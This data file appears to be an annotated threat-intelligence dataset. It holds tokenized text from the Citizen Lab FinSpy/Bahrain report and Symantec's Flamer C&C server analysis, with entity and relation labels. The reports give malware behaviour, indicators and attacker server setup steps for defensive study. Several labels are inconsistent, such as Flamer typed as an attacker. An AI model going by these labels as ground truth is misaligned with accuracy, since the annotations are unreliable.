"0\u00fe-0800UTC", "DST", ".", "1\u00fe2012-07-18", "18:00:21", ".", ":\u00fe1970-01-01"], ["00:16:00Abhwatch1"], ["Record", "#", "1", "Length:", "96", "bytes:"], ["`USERNAME", ",", "FULLNAME,COUNTRY,AUTHORIZED,BLOCKED"], ["Record", "#", "2", "Length:", "90", "bytes:"], ["Zecho123", ",", "Echo", "/", "Sound", "Test", "Service", ",", ",YES,NO"], ["Record", "#", "3", "Length:", "95", "bytes:"], ["^bhwatch2", ",", "Bahrain", "Watch", ",", "United", "States", ",", "YES,NO"], ["14"], ["July", "2012"], ["Submodule", "Y", "==", "3", "records", "file", "transfers", ".", "After", "a", "Skype", "file", "transfer", "concludes", ",", "the", "following", "file", "is", "created:"], ["%USERPROFILE%\\Local", "Settings\\Temp\\smtXX", ".", "tmp.", "This", "file", "appears", "to", "contain", "the", "sent", "/", "received"], ["file", ".", "As", "soon", "as", "smtXX", ".", "tmp", "is", "finished", "being", "written", "to", "disk", ",", "a", "file", "(1431XXXXXXXX", ".", "dat)", "is", "written", ","], ["roughly", "the", "same", "size", "as", "smtXX", ".", "tmp.", "After", "sending", "a", "picture", "(of", "birdshot", "shotgun", "shell", "casings", "used", "by"], ["Bahrain\u2019s", "police)", "to", "an", "infected", "Skype", "client", ",", "the", "file", "1431028D41FD", ".", "dat", "was", "observed", "being", "written", "to"], ["disk", ".", "Decrypting", "it", "revealed", "the", "following:"], ["Record", "#", "0", "Length:", "441", "bytes:"], ["\u00b9"], ["@\u00fe\u00ff\u00cc\u00b3\u00d0"], ["@"], ["\u00a4b\u00afOp\u00fe192", ".", "168.131.67Abhwatch1Bbhwatch2\"CBahrain", "WatchIreceivedrC:\\Documents", "and"], ["Settings\\XPMUser\\My", "Documents\\gameborev3", ".", "jpgJRecording", "0\u00fe-0800UTC", "DST", ".", "1\u00fe2012-07-20"], ["12:18:21", ".", ":\u00fe2012-07-20", "12:18:21"], ["Record", "#", "1", "Length:", "78247", "bytes:"], ["[Note:", "Record", "#1", "contained", "the", "contents", "of", "the", "", ".", "jpg", "file", ",", "preceded", "by", "hex", "A731010090051400", ",", "and"], ["followed", "by", "hex", "0A0A0A0A", ".", "]"], ["15"], ["July", "2012"], ["Additionally", ",", "submodule", "Y", "==", "1", "records", "Skype", "chat", "messages", ",", "and", "submodule", "Y", "==", "2", "records", "audio", "from", "all"], ["participants", "in", "a", "Skype", "call", ".", "The", "call", "recording", "functionality", "appears", "to", "be", "provided", "by", "hooking"], ["DirectSoundCaptureCreate:"], ["COMMAND", "AND", "CONTROL"], ["This", "section", "describes", "the", "communications", "behavior", "of", "the", "malware", "."], ["When", "we", "examined", "the", "malware", "samples", "we", "found", "that", "they", "connect", "to", "a", "server", "at", "IP", "address", "77", ".", "69.140.194"], ["16"], ["July", "2012"], ["WHOIS", "data7", "reveals", "that", "this", "address", "is", "owned", "by", "Batelco", ",", "the", "principal", "telecommunications", "company", "of"], ["Bahrain:"], ["inetnum:", "77", ".", "69.128.0", "-", "77", ".", "69.159.255"], ["netname:", "ADSL"], ["descr:", "Batelco", "ADSL", "service"], ["country:", "bh"], ["For", "a", "period", "of", "close", "to", "10", "minutes", ",", "traffic", "was", "observed", "between", "the", "infected", "victim", "and", "the", "command", "and"], ["control", "host", "in", "Bahrain", "."], ["A", "summary", "of", "the", "traffic", "by", "port", "and", "conversation", "size", "(click", "image", "to", "enlarge):"], ["The", "infected", "VM", "talks", "to", "the", "remote", "host", "on", "the", "following", "five", "TCP", "ports:"], ["22"], ["53"], ["80"], ["443"], ["4111"], ["Based", "on", "observation", "of", "an", "infected", "machine", "we", "were", "able", "to", "determine", "that", "the", "majority", "of", "data", "is", "exfiltrated"], ["to", "the", "remote", "host", "via", "ports", "443", "and", "4111", "."], ["17"], ["July", "2012"], ["192", ".", "168.131.65:1213", "->", "77", ".", "69.140.194:443", "1270075", "bytes"], ["192", ".", "168.131.65:4111", "->", "77", ".", "69.149.194:4111", "4766223", "bytes"], ["CONCLUSIONS", "ABOUT", "MALWARE", "IDENTIFICATION"], ["Our", "analysis", "yields", "indicators", "about", "the", "identity", "of", "the", "malware", "we", "have", "analyzed:", "(1)", "debug", "strings", "found", "the"], ["in", "memory", "of", "infected", "processes", "appear", "to", "identify", "the", "product", "and", "(2)", "the", "samples", "have", "similarities", "with"], ["malware", "that", "communicates", "with", "domains", "belonging", "to", "Gamma", "International", "."], ["Debug", "Strings", "found", "in", "memory"], ["As", "we", "previously", "noted", ",", "infected", "processes", "were", "found", "containing", "strings", "that", "include", "\u201cfinspyv4", ".", "01\u201d", "and"], ["\u201cfinspyv2\u201d:"], ["y:\\lsvn_branches\\finspyv4", ".", "01\\finspyv2\\src\\libs\\libgmp\\mpn-tdiv_qr.c"], ["y:\\lsvn_branches\\finspyv4", ".", "01\\finspyv2\\src\\libs\\libgmp\\mpn-mul_fft.c"], ["y:\\lsvn_branches\\finspyv4", ".", "01\\finspyv2\\src\\target\\bootkit_x32driver\\objfre_w2k_x86\\i386\\bootkit_x32driv"], ["er", ".", "pdb"], ["Publicly", "available", "descriptions", "of", "the", "FinSpy", "tool", "collected", "by", "Privacy", "International", "among", "others", "and", "posted"], ["on", "Wikileaks8", "make", "the", "a", "series", "of", "claims", "about", "functionality:"], ["\uf0b7"], ["\uf0b7"], ["\uf0b7"], ["\uf0b7"], ["\uf0b7"], ["\uf0b7"], ["\uf0b7"], ["\uf0b7"], ["\uf0b7"], ["\uf0b7"], ["\uf0b7"], ["Bypassing", "of", "40", "regularly", "tested", "Antivirus", "Systems"], ["Covert", "Communication", "with", "Headquarters"], ["Full", "Skype", "Monitoring", "(Calls", ",", "Chats", ",", "File", "Transfers", ",", "Video", ",", "Contact", "List)"], ["Recording", "of", "common", "communication", "like", "Email", ",", "Chats", "and", "Voice-over-IP"], ["Live", "Surveillance", "through", "Webcam", "and", "Microphone"], ["Country", "Tracing", "of", "Target"], ["Silent", "Extracting", "of", "Files", "from", "Hard-Disk"], ["Process-based", "Key-logger", "for", "faster", "analysis"], ["Live", "Remote", "Forensics", "on", "Target", "System"], ["Advanced", "Filters", "to", "record", "only", "important", "information"], ["Supports", "most", "common", "Operating", "Systems", "(Windows", ",", "Mac", "OSX", "and", "Linux)"], ["18"], ["July", "2012"], ["Shared", "behavior", "with", "a", "sample", "that", "communicates", "with", "Gamma"], ["The", "virtual", "machine", "used", "by", "the", "packer", "has", "very", "special", "sequences", "in", "order", "to", "execute", "the", "virtualised", "code", ",", "for"], ["example:"], ["66", "C7", "07", "9D", "61", "mov", "word", "ptr", "[edi]", ",", "619Dh"], ["C6", "47", "02", "68", "mov", "byte", "ptr", "[edi+2]", ",", "68h"], ["89", "57", "03", "mov", "[edi+3]", ",", "edx"], ["C7", "47", "07", "68", "00", "00", "00", "mov", "dword", "ptr", "[edi+7]", ",", "68h"], ["89", "47", "08", "mov", "[edi+8]", ",", "eax"], ["C6", "47", "0C", "C3", "mov", "byte", "ptr", "[edi+0Ch]", ",", "0C3h"], ["Based", "on", "this", "we", "created", "a", "signature", "from", "the", "Bahrani", "malware", ",", "which", "we", "shared", "with", "another", "security"], ["researcher", "who", "identified", "a", "sample", "that", "shared", "similar", "virtualised", "obfuscation", ".", "That", "sample", "is:"], ["md5:", "c488a8aaef0df577efdf1b501611ec20"], ["sha1:", "5ea6ae50063da8354e8500d02d0621f643827346"], ["sha256:", "81531ce5a248aead7cda76dd300f303dafe6f1b7a4c953ca4d7a9a27b5cd6cdf"], ["The", "sample", "connects", "to", "the", "following", "domains:"], ["tiger", ".", "gamma-international.de"], ["ff-demo", ".", "blogdns.org"], ["The", "domain", "tiger", ".", "gamma-international.de", "has", "the", "following", "Whois", "information9:"], ["Domain:", "gamma-international", ".", "de"], ["Name:", "Martin", "Muench"], ["Organisation:", "Gamma", "International", "GmbH"], ["Address:", "Baierbrunner", "Str", ".", "15"], ["PostalCode:", "81379"], ["City:", "Munich"], ["CountryCode:", "DE"], ["Phone:", "+49-89-2420918-0"], ["Fax:", "+49-89-2420918-1"], ["Email:", "info@gamma-international", ".", "de"], ["Changed:", "2011-04-04T11:24:20+02:00"], ["19"], ["July", "2012"], ["Martin", "Muench", "is", "a", "representative", "of", "Gamma", "International", ",", "a", "company", "that", "sells", "\u201cadvanced", "technical"], ["surveillance", "and", "monitoring", "solutions\u201d", ".", "One", "of", "the", "services", "they", "provide", "is", "FinFisher:", "IT", "Intrusion", ",", "including"], ["the", "FinSpy", "tool", ".", "This", "labelling", "indicates", "that", "the", "matching", "sample", "we", "were", "provided", "may", "be", "a", "demo", "copy", "a"], ["FinFisher", "product", "per", "the", "domain", "ff-demo", ".", "blogdns.org."], ["We", "have", "linked", "a", "set", "of", "novel", "virtualised", "code", "obfuscation", "techniques", "in", "our", "Bahraini", "samples", "to", "another"], ["binary", "that", "communicates", "with", "Gamma", "International", "IP", "addresses", ".", "Taken", "alongside", "the", "explicit", "use", "of", "the"], ["name", "\u201cFinSpy\u201d", "in", "debug", "strings", "found", "in", "infected", "processes", ",", "we", "suspect", "that", "the", "malware", "is", "the", "FinSpy", "remote"], ["intrusion", "tool", ".", "This", "evidence", "appears", "to", "be", "consistent", "with", "the", "theory", "that", "the", "dissidents", "in", "Bahrain", "who"], ["received", "these", "e-mails", "were", "targeted", "with", "the", "FinSpy", "tool", ",", "configured", "to", "exfiltrate", "their", "harvested", "information"], ["to", "servers", "in", "Bahraini", "IP", "space", ".", "If", "this", "is", "not", "the", "case", ",", "we", "invite", "Gamma", "International", "to", "explain", "."], ["RECOMMENDATIONS"], ["The", "samples", "from", "email", "attachments", "have", "been", "shared", "with", "selected", "individuals", "within", "the", "security"], ["community", ",", "and", "we", "strongly", "urge", "antivirus", "companies", "and", "security", "researchers", "to", "continue", "where", "we", "have", "left"], ["off", "."], ["Be", "wary", "of", "opening", "unsolicited", "attachments", "received", "via", "email", ",", "skype", "or", "any", "other", "communications"], ["mechanism", ".", "If", "you", "believe", "that", "you", "are", "being", "targeted", "it", "pays", "to", "be", "especially", "cautious", "when", "downloading"], ["files", "over", "the", "Internet", ",", "even", "from", "links", "that", "are", "purportedly", "sent", "by", "friends", "."], ["ACKNOWLEDGEMENTS"], ["Malware", "analysis", "by", "Morgan", "Marquis-Boire", "and", "Bill", "Marczak", ".", "Assistance", "from", "Seth", "Hardy", "and", "Harry", "Tuttle"], ["gratefully", "received", "."], ["Special", "thanks", "to", "John", "Scott-Railton", "."], ["Thanks", "to", "Marcia", "Hofmann", "and", "the", "Electronic", "Frontier", "Foundation", "(EFF)", "."], ["We", "would", "also", "like", "to", "acknowledge", "Privacy", "International", "for", "their", "continued", "work", "and", "graciously", "provided"], ["background", "information", "on", "Gamma", "International", "."], ["20"], ["July", "2012"], ["FOOTNOTES"], ["1"], ["http://www", ".", "finfisher.com/"], ["http://owni", ".", "eu/2011/12/15/finfisher-for-all-your-intrusive-surveillance-needs/#SpyFiles"], ["3"], ["http://blogs", ".", "aljazeera.com/profile/melissa-chan"], ["4"], ["This", "technique", "was", "used", "in", "the", "recent", "Madi", "malware", "attacks", "."], ["5"], ["http://www", ".", "finfisher.com/"], ["6"], ["Unpacking", "Virtualised", "Obfuscators", "by", "Rolf", "Rolles", "http://static", ".", "usenix.org/event/woot09/tech/full_papers/rolles.pdf"], ["7"], ["http://whois", ".", "domaintools.com/77.69.140.194"], ["2"], ["8"], ["9"], ["E", ".", "g.", "http://wikileaks", ".", "org/spyfiles/files/0/289_GAMMA-201110-FinSpy.pdf"], ["http://whois", ".", "domaintools.com/gamma-international.de"], ["Back", "to", "top"], ["MEDIA", "COVERAGE"], ["The", "Wall", "Street", "Journal"], ["Slate"], ["CSO"], ["Tech", "Week", "Europe"], ["Bloomberg"], ["Electronic", "Frontier", "Foundation"], ["Privacy", "International"], ["Spiegel", "Online"], ["PC", "Mag"], ["The", "New", "York", "Times"], ["About", "the", "Author"], ["Morgan", "Marquis-Boire", "is", "a", "Technical", "Advisor", "at", "the", "Citizen", "Lab", ",", "Munk", "School", "of", "Global", "Affairs", ",", "University"], ["of", "Toronto", ".", "He", "works", "as", "a", "Security", "Engineer", "at", "Google", "specializing", "in", "Incident", "Response", ",", "Forensics", "and"], ["Malware", "Analysis", "."], ["21"]]}], [{"vertexSet": [{"old_id": "T1", "type": "Malware", "name": "W32Flamer", "sent_id": 26, "pos": []}, {"old_id": "T2", "type": "Region", "name": "Middle East", "sent_id": 27, "pos": [1, 2]}, {"old_id": "T3", "type": "Organization", "name": "Symantec", "sent_id": 30, "pos": [2]}, {"old_id": "T4", "type": "Organization", "name": "CERT-Bund/BSI", "sent_id": 39, "pos": [2]}, {"old_id": "T5", "type": "Organization", "name": "IMPACT", "sent_id": 39, "pos": [4]}, {"old_id": "T6", "type": "Organization", "name": "Kaspersky", "sent_id": 39, "pos": [7]}, {"old_id": "T7", "type": "Time", "name": "May 18 2012", "sent_id": 45, "pos": [7, 10]}, {"old_id": "T8", "type": "Attacker", "name": "Flamer", "sent_id": 43, "pos": [6]}, {"old_id": "T9", "type": "Time", "name": "March 25 2012", "sent_id": 47, "pos": [15, 18]}, {"old_id": "T10", "type": "MalwareCharacteristics", "name": "record a minimal amount of information", "sent_id": 49, "pos": [7, 12]}, {"old_id": "T11", "type": "Indicator", "name": "Newsforyou", "sent_id": 73, "pos": [0]}, {"old_id": "T12", "type": "Malware", "name": "W32Flamer", "sent_id": 74, "pos": []}, {"old_id": "T13", "type": "Time", "name": "May 18 2012", "sent_id": 136, "pos": [13, 16]}, {"old_id": "T14", "type": "Time", "name": "13:53", "sent_id": 138, "pos": [5]}, {"old_id": "T15", "type": "Time", "name": "11:26 (UTC)", "sent_id": 136, "pos": [19, 20]}, {"old_id": "T16", "type": "Malware", "name": "W32Flamer", "sent_id": 138, "pos": []}, {"old_id": "T17", "type": "Time", "name": "16:15", "sent_id": 139, "pos": [0]}, {"old_id": "T18", "type": "Time", "name": "March 25 2012", "sent_id": 140, "pos": [10, 13]}, {"old_id": "T19", "type": "Exploit", "name": "Newsforyou", "sent_id": 147, "pos": [2]}, {"old_id": "T20", "type": "Malware", "name": "W32Flamer", "sent_id": 147, "pos": []}, {"old_id": "T21", "type": "Event", "name": "Logging activities were disabled", "sent_id": 201, "pos": [11, 14]}, {"old_id": "T22", "type": "Event", "name": "existing log files were securely deleted", "sent_id": 201, "pos": []}, {"old_id": "T23", "type": "Malware", "name": "UnloadCheckerphp", "sent_id": 232, "pos": []}, {"old_id": "T24", "type": "File", "name": "Eraserpy", "sent_id": 238, "pos": []}, {"old_id": "T25", "type": "Indicator", "name": "pycleanscr", "sent_id": 246, "pos": [4]}, {"old_id": "T26", "type": "File", "name": "Connectionpy", "sent_id": 293, "pos": []}, {"old_id": "T27", "type": "MalwareCharacteristics", "name": "dnslocationinfo", "sent_id": 292, "pos": []}, {"old_id": "T28", "type": "Time", "name": "May 18", "sent_id": 297, "pos": [5, 6]}, {"old_id": "T29", "type": "File", "name": "LogWiper_fixedtxt", "sent_id": 309, "pos": []}, {"old_id": "T30", "type": "File", "name": "Deletephp", "sent_id": 305, "pos": []}, {"old_id": "T31", "type": "File", "name": "pycleanscr", "sent_id": 302, "pos": [0]}, {"old_id": "T32", "type": "Exploit", "name": "Shred", "sent_id": 332, "pos": [5]}, {"old_id": "T33", "type": "Attacker", "name": "W32Flamer", "sent_id": 334, "pos": []}, {"old_id": "T34", "type": "Indicator", "name": "This function was added by D*** returns a true/false value depending on if this is a Windows box", "sent_id": 372, "pos": []}, {"old_id": "T35", "type": "Attacker", "name": "D***", "sent_id": 379, "pos": [0]}, {"old_id": "T36", "type": "Attacker", "name": "H*****", "sent_id": 383, "pos": [0]}, {"old_id": "T37", "type": "Attacker", "name": "O******", "sent_id": 386, "pos": [0]}, {"old_id": "T38", "type": "Attacker", "name": "R***", "sent_id": 389, "pos": [0]}, {"old_id": "T39", "type": "File", "name": "indexphp", "sent_id": 416, "pos": []}, {"old_id": "T40", "type": "Indicator", "name": "PROTOCOL_OLD*", "sent_id": 429, "pos": [0]}, {"old_id": "T41", "type": "Indicator", "name": "PROTOCOL_SIGNUP", "sent_id": 432, "pos": [0]}, {"old_id": "T42", "type": "Indicator", "name": "PROTOCOL_OLD_E**", "sent_id": 435, "pos": [0]}, {"old_id": "T43", "type": "Indicator", "name": "PROTOCOL_RED", "sent_id": 438, "pos": [0]}, {"old_id": "T44", "type": "Malware", "name": "W32Flamer", "sent_id": 441, "pos": []}, {"old_id": "T45", "type": "TrojanHorse", "name": "CLIENT_TYPE_SP", "sent_id": 460, "pos": [0]}, {"old_id": "T46", "type": "TrojanHorse", "name": "CLIENT_TYPE_SPE", "sent_id": 464, "pos": [0]}, {"old_id": "T47", "type": "TrojanHorse", "name": "CLIENT_TYPE_FL", "sent_id": 468, "pos": [0]}, {"old_id": "T48", "type": "TrojanHorse", "name": "CLIENT_TYPE_IP", "sent_id": 472, "pos": [0]}, {"old_id": "T49", "type": "MD5", "name": "0xfccd97e2513089e74ba707bbf4c1b0e5", "sent_id": 550, "pos": [0]}, {"old_id": "T50", "type": "Payload", "name": "59c5452fb2ba21091513ccdc1e0ec7fd", "sent_id": 551, "pos": [0]}, {"old_id": "T51", "type": "UserName", "name": "username", "sent_id": 563, "pos": [1]}, {"old_id": "T52", "type": "Hash", "name": "27934e96d90d06818674b98bec7230fa", "sent_id": 564, "pos": [2]}, {"old_id": "T53", "type": "UserName", "name": "news_user", "sent_id": 604, "pos": [0]}, {"old_id": "T54", "type": "Password", "name": "news_pass", "sent_id": 605, "pos": [0]}, {"old_id": "T55", "type": "Hash", "name": "27934e96d90d06818674b98bec7230fa", "sent_id": 624, "pos": [0]}, {"old_id": "T56", "type": "Country", "name": "Israel", "sent_id": 742, "pos": [0]}], "labels": [{"old_id": "R1", "r": "P32", "h": 0, "t": 1, "evidence": [26, 27]}, {"old_id": "R2", "r": "P33", "h": 7, "t": 6, "evidence": [43, 44, 45]}, {"old_id": "R3", "r": "P21", "h": 10, "t": 11, "evidence": [73, 74]}, {"old_id": "R4", "r": "P33", "h": 15, "t": 17, "evidence": [138, 139, 140]}, {"old_id": "R5", "r": "P33", "h": 15, "t": 12, "evidence": []}, {"old_id": "R6", "r": "P33", "h": 15, "t": 14, "evidence": []}, {"old_id": "R7", "r": "P33", "h": 15, "t": 13, "evidence": [138]}, {"old_id": "R8", "r": "P33", "h": 15, "t": 16, "evidence": [138, 139]}, {"old_id": "R9", "r": "P23", "h": 32, "t": 31, "evidence": []}, {"old_id": "R10", "r": "P21", "h": 42, "t": 43, "evidence": [438, 439, 440, 441]}, {"old_id": "R11", "r": "P21", "h": 41, "t": 43, "evidence": [435, 436, 437, 438, 439, 440, 441]}, {"old_id": "R12", "r": "P21", "h": 40, "t": 43, "evidence": [432, 433, 434, 435, 436, 437, 438, 439, 440, 441]}, {"old_id": "R13", "r": "P21", "h": 39, "t": 43, "evidence": [429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441]}], "title": ["inputs/txt/201205SymantecFlamer"], "sents": [["Security", "Response"], ["Have", "I", "Got", "Newsforyou:"], ["Analysis", "of", "Flamer", "C&C"], ["Server"], ["Symantec", "Security"], ["Response"], ["Contents"], ["Overview", ".", "............................................................", "1"], ["Background", ".", "........................................................", "2"], ["The", "server", ".", "..........................................................", "3"], ["The", "home", "directory", ".", "............................................", "6"], ["Stress", "testing", "in", "applications", ".", ".......................", "6"], ["Cleaning", "up", ".", "...................................................", "7"], ["Disabling", "logging", ".", "..........................................", "7"], ["The", "Web", "application", ".", "..........................................", "7"], ["Authors", ".", ".........................................................", "8"], ["Protocols", ".", ".......................................................", "9"], ["Stolen", "Data", ".", ".................................................", "11"], ["Activity", ".", "........................................................", "13"], ["Payload", ".", ".......................................................", "14"], ["The", "control", "panel", ".", ".............................................", "14"], ["The", "database", ".", "....................................................", "16"], ["Schema", ".", "......................................................", "16"], ["Conclusion", ".", ".......................................................", "18"], ["Resources", "", ".", "........................................................", "19"], ["Overview"], ["W32", ".", "Flamer", "is", "a", "sophisticated", "cyber", "espionage", "tool", "that", "targeted"], ["the", "Middle", "East", ".", "It", "is", "modular", "in", "design", "and", "contains", "some", "novel"], ["functionality", ",", "most", "notably", "its", "ability", "to", "spread", "across", "networks", "using"], ["a", "previously", "unknown", "man-in-the-middle", "attack", "against", "Windows"], ["Update", ".", "Symantec", "has", "performed", "a", "detailed", "forensic", "analysis", "of", "two"], ["of", "the", "command-and-control", "(C&C)", "servers", "used", "in", "the", "W32", ".", "Flamer"], ["attacks", "from", "earlier", "this", "year", "."], ["Based", "on", "our", "analysis", ",", "we", "were", "able", "to", "uncover", "details", "such", "as", "when"], ["the", "servers", "were", "operational", ",", "what", "entities", "were", "targeted", ",", "nicknames"], ["of", "those", "involved", "in", "the", "attack", ",", "and", "techniques", "used", "by", "the", "attackers"], ["to", "avoid", "discovery", "should", "the", "command-and-control", "server", "be"], ["compromised", "."], ["Analysis", "of", "these", "C&C", "servers", "was", "performed", "as", "a", "joint", "effort", "between"], ["Symantec", ",", "CERT-Bund/BSI", ",", "IMPACT", ",", "and", "Kaspersky", ".", "This", "paper"], ["focuses", "on", "the", "detailed", "forensic", "examination", "Symantec", "carried", "out", "on"], ["the", "C&C", "server", "images", "."], ["Security", "Response"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["Background"], ["The", "first", "server", "was", "set", "up", "on", "May", "18", ",", "2012", ",", "and", ",", "just", "five", "hours", "after", "it", "was", "set", "up", ",", "it", "recorded", "the", "first"], ["interaction", "with", "a", "Flamer-compromised", "client", ".", "The", "server", "would", "go", "on", "to", "control", "at", "least", "a", "few", "hundred"], ["compromised", "clients", "over", "the", "next", "few", "weeks", ".", "The", "second", "server", "was", "set", "up", "on", "March", "25", ",", "2012", ",", "and", "controlled"], ["over", "a", "thousand", "clients", "in", "a", "period", "of", "just", "over", "one", "week", "."], ["The", "servers", "had", "been", "set", "up", "to", "record", "a", "minimal", "amount", "of", "information", "in", "case", "of", "discovery", ".", "The", "systems", "were"], ["configured", "to", "disable", "any", "unnecessary", "logging", "events", "and", "entries", "in", "the", "database", "were", "deleted", "at", "regular"], ["intervals", ".", "Existing", "log", "files", "were", "securely", "deleted", "from", "the", "servers", "on", "a", "regular", "basis", ".", "These", "steps", "were", "taken", "in"], ["order", "to", "hamper", "any", "investigation", "should", "the", "server", "fall", "into", "the", "hands", "of", "investigators", "or", "law", "enforcement", "."], ["However", ",", "the", "attackers", "were", "not", "thorough", "enough", ",", "as", "files", "revealing", "the", "entire", "history", "of", "the", "servers\u2019", "setup", "were"], ["available", "and", "a", "limited"], ["Figure", "1"], ["set", "of", "encrypted", "records"], ["Data", "security", "compartmentalization", "used", "by", "W32", ".", "Flamer", "attackers"], ["in", "the", "database", "revealed"], ["that", "compromised", "clients"], ["had", "been", "connecting"], ["from", "the", "Middle", "East", ".", "We"], ["were", "also", "able", "to", "recover"], ["the", "nicknames", "of", "four"], ["authors\u2014D***", ",", "H*****", ","], ["O******", ",", "and", "R***\u2014who"], ["had", "worked", "on", "the", "code"], ["at", "various", "stages", "and", "on"], ["differing", "aspects", "of", "the"], ["project", "."], ["On", "both", "servers", "commandand-control", "activity"], ["happens", "through", "a"], ["Web", "application", "called"], ["Newsforyou", ".", "It", "processes"], ["the", "W32", ".", "Flamer", "client"], ["interactions", "and", "provides"], ["a", "simple", "control", "panel", "."], ["The", "control", "panel", "allows"], ["the", "attackers", "to", "upload"], ["packages", "of", "code", "to"], ["deliver", "to", "compromised"], ["clients", ",", "and", "download"], ["packages", "containing"], ["stolen", "client", "data", "."], ["However", ",", "in", "a", "technique"], ["not", "previously", "seen"], ["before", "the", "uploaded", "and"], ["downloaded", "packages", "are"], ["encrypted", ",", "so", "infiltrating"], ["the", "command-and-control"], ["server", "does", "not", "reveal"], ["the", "code", "or", "the", "stolen"], ["client", "data", ".", "The", "command-"], ["Page", "2"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["Security", "Response"], ["and-control", "server", "simply", "serves", "as", "a", "proxy", "for", "the", "data", "and", "the", "data", "is", "encrypted", "and", "decrypted", "offline", "by", "the"], ["attackers", "using", "keys", "unique", "to", "each", "client", ".", "This", "application", "also", "contains", "functionality", "to", "communicate", "with"], ["clients", "compromised", "by", "malware", "other", "than", "Flamer", ".", "The", "Web", "application", "was", "designed", "to", "be", "a", "framework", "for"], ["supporting", "different", "malware", "campaigns", "."], ["In", "addition", "to", "avoiding", "the", "compromise", "of", "their", "operations", ",", "preventing", "both", "the", "uploading", "of", "rogue", "code", "and"], ["viewing", "of", "stolen", "data", ",", "the", "setup", "also", "maintains", "a", "clear", "distinction", "of", "roles", ".", "The", "roles", "include", "those", "responsible"], ["for", "setting", "up", "the", "server", "(admins)", ",", "those", "responsible", "for", "uploading", "packages", "and", "downloading", "stolen", "data"], ["through", "the", "control", "panel", "(operators)", ",", "and", "those", "holding", "the", "private", "key", "with", "the", "ability", "to", "decrypt", "the", "stolen"], ["data", "(attack", "coordinators)", ".", "The", "operators", "themselves", "may", "actually", "be", "completely", "unaware", "of", "the", "contents", "in", "the"], ["stolen", "data", ".", "This", "is", "due", "to", "design", "of", "the", "process", "to", "use", "data", "security", "compartmentalization", "techniques", ",", "as", "shown"], ["in", "Figure", "1", "."], ["Despite", "these", "techniques", ",", "we", "were", "still", "able", "to", "determine", "that", "one", "of", "the", "servers", "delivered", "a", "module", "instructing"], ["Flamer", "to", "commit", "suicide", "and", "wipe", "itself", "off", "computers", "in", "late", "May", "2012", ",", "an", "action", "we", "also", "witnessed", "through"], ["compromised", "honeypots", "."], ["Finally", ",", "access", "to", "the", "control", "panel", "required", "a", "password", "which", "is", "stored", "as", "a", "hash", ".", "Despite", "brute", "force", "attempts"], ["at", "reversing", "the", "hash", "to", "plain", "text", ",", "we", "were", "unable", "to", "determine", "the", "plain", "text", "password", "."], ["What", "follows", "is", "a", "thorough", "analysis", "of", "one", "of", "the", "command-and-control", "servers", ",", "detailing", "the", "server", "setup", ",", "the"], ["Web", "application", "developed", "by", "at", "least", "four", "separate", "authors", "since", "2006", ",", "the", "control", "panel", "used", "by", "the", "operators", ","], ["and", "the", "database", "that", "helps", "drive", "the", "application", ".", "The", "report", "also", "includes", "key", "information", "about", "a", "second"], ["server", ",", "but", "in-depth", "details", "have", "been", "omitted", "to", "maintain", "the", "brevity", "of", "this", "report", ".", "The", "functionality", "and"], ["structure", "of", "both", "servers", "is", "identical", ".", "The", "differences", "are", "mainly", "in", "the", "amount", "of", "data", "and", "number", "of", "clients", "the"], ["servers", "were", "exposed", "to", "."], ["The", "server"], ["File", "system"], ["The", "following", "table", "details", "the", "important", "locations", "relevant", "to", "the", "investigation", "of", "the", "command-and-control"], ["servers", "."], ["Table", "1"], ["Location"], ["Description"], ["/root/", ".", "bash_history"], ["Contains", "a", "history", "of", "root", "user", "commands"], ["/var/spool/crontabs/root"], ["Scripts", "set", "up", "to", "run", "at", "regular", "intervals"], ["//home/[USERNAME]"], ["Operator", "home", "directory", ",", "contains", "various", "scripts"], ["/var/www/htdocs/newsforyou"], ["Command-and-Control", "Web", "application"], ["/var/lib/mysql"], ["MySQL", "database"], ["Server", "setup"], ["The", "first", "sign", "of", "activity", "from", "the", "attackers", "on", "the", "first", "server", "was", "May", "18", ",", "2012", ".", "At", "11:26", "(UTC)", "the", "first"], ["scheduled", "job", "was", "run", "and", "a", "little", "over", "two", "hours", "later", "the", "server", "was", "fully", "operational", ".", "A", "malicious", "package", "was"], ["uploaded", "to", "the", "server", "at", "13:53", ".", "The", "first", "recorded", "interaction", "with", "a", "W32", ".", "Flamer", "compromised", "client", "was", "at"], ["16:15", ",", "when", "stolen", "data", "was", "uploaded", "to", "the", "server", "."], ["In", "comparison", ",", "the", "second", "server", "saw", "initial", "activity", "on", "March", "25", ",", "2012", ",", "and", "was", "fully", "operational", "on", "the", "same"], ["day", "."], ["Page", "3"], ["Security", "Response"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["During", "the", "server", "set", "up", ",", "the", "attackers", "installed", "various", "applications", "and", "tested", "connections", "to", "the", "MySQL"], ["database", "which", "supported", "their", "custom", "Web", "application", ".", "The", "end", "goal", "was", "to", "install", "a", "command-and-control"], ["application", "called", "Newsforyou", "which", "interacted", "with", "compromised", "W32", ".", "Flamer", "clients", "."], ["An", "important", "step", "taken", "by", "the", "attackers", "was", "to", "hide", "traces", "of", "their", "activity", "on", "the", "server", ".", "They", "did", "this", "by"], ["disabling", "logging", "and", "securely", "removing", "existing", "log", "files", ".", "The", "attackers", ",", "however", ",", "did", "not", "clear", "out", "the", "history"], ["of", "commands", "issued", "through", "the", "console", "by", "the", "administrator", "(root)", "account", ".", "This", "data", "was", "visible", "and", "was"], ["retrieved", "from", "the", "/root/", ".", "bash_history", "file", ",", "which", "revealed", "these", "activities", ".", "The", "following", "table", "lists", "and"], ["describes", ",", "in", "brief", ",", "a", "subset", "of", "commands", "that", "are", "most", "relevant", "to", "the", "server", "set", "up:"], ["Table", "2"], ["Command", "Executed"], ["Description"], ["netstat", "\u2013an"], ["Checks", "open", "network", "connections"], ["telnet", "localhost", "3306"], ["Tests", "MySQL", "server", "is", "accepting", "connections"], ["nano", "apache2", ".", "conf"], ["Configures", "Web", "server"], ["adduser", "[USERNAME]"], ["Adds", "user", "[USERNAME]"], ["crontab", "/etc/cron", ".", "newsforyou"], ["Cronjob", "executes", "scripts", "at", "regular", "intervals"], ["openssl", "req", "-newkey", "rsa:1024", "-nodes", "-x509", "-days"], ["Creates", "SSL", "key"], ["python", "__main__", ".", "py", "0", "2", "1", "\"127", ".", "0.0.1\"", "100", "100"], ["Simulator", "test", 